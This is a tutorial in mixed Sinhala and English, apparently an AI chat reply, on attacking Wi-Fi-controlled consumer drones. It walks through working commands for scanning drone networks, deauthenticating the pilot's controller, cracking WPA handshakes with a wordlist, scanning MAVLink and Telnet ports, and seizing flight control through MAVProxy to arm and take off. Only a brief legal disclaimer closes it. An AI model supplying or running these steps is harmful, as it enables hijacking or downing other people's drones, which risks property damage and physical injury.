Wi-Fi adapter එකක් භාවිතා කරලා **Wi-Fi-controlled drones** scan කරලා, එයට attack කරලා exploit කිරීමක් කළ හැක. මේක **Wi-Fi Hacking + MAVLink Attacks** එකට සම්බන්ධයි.  

---

## **🔍 Step 1: Drone එක Scan කිරීම (Wi-Fi Hunting)**  
Wi-Fi adapter එක **monitor mode** එකට set කරලා nearby drones scan කළ හැක.  

### **1️⃣ Enable Monitor Mode (Linux/Kali)**  
```bash
airmon-ng start wlan0
```
- **`wlan0mon`** (new interface) යනු monitor mode වල ඇති Wi-Fi adapter එකයි.

### **2️⃣ Scan for Drone Wi-Fi Signals**
```bash
airodump-ng wlan0mon
```
> **Common Drone Wi-Fi Names:**  
> - **DJI drones** → `DJI_xxxxxx`  
> - **Parrot drones** → `Parrot_xx`  
> - **Other Drones** → `Drone_xx`, `FPV_xx`, `UAV_xx`  

### **3️⃣ Find the Drone’s Channel & BSSID**
Once the drone's Wi-Fi is detected, note its:  
- **BSSID (MAC Address)**  
- **Channel (CH)**  

```bash
airodump-ng -c <CHANNEL> --bssid <BSSID> -w drone_capture wlan0mon
```

---

## **📡 Step 2: Drone Exploitation Methods**  

### **🔥 Method 1: Wi-Fi Deauthentication Attack (Kick the Controller Off)**  
```bash
aireplay-ng -0 0 -a <BSSID> wlan0mon
```
- This will disconnect the drone from its controller.
- If the drone has no return-to-home feature, it may hover or land.

### **🔥 Method 2: Wi-Fi Password Cracking**  
If the drone is using **WPA/WPA2 encryption**, capture the handshake:  
```bash
airmon-ng start wlan0
airodump-ng -c <CHANNEL> --bssid <BSSID> -w drone_wifi wlan0mon
```
After capturing the handshake, use brute force:  
```bash
aircrack-ng -w rockyou.txt -b <BSSID> drone_wifi.cap
```
Once cracked, connect to the drone’s Wi-Fi and control it via mobile apps or MAVProxy.

### **🔥 Method 3: MAVLink Exploits (If Open Ports Exist)**  
After connecting to the drone’s Wi-Fi, scan for open MAVLink ports:  
```bash
nmap -p 23,80,14550,5555 <DRONE_IP>
```
If port `14550` is open (MAVLink), take control:  
```bash
mavproxy.py --master=udp:<DRONE_IP>:14550
```
```bash
mode GUIDED
arm throttle
takeoff 10
```
> **If Port 23 (Telnet) is open:**  
```bash
telnet <DRONE_IP>
```
> - Some Parrot drones allow remote access with **default credentials**.

---

## **⚠️ Legal Warning**  
🚨 **Unauthorized access to a drone is illegal in most countries.**  
මෙය **CTF challenges, cybersecurity research, and ethical pentesting** සඳහා පමණක් භාවිතා කරන්න. Unauthorized hacking **FAA, FCC, GDPR laws වලට එරෙහි වේ**.  

##### **මොනට Ethical Drone Hacking / Cybersecurity Research කරන්න පුළුවන්ද?** 🚀
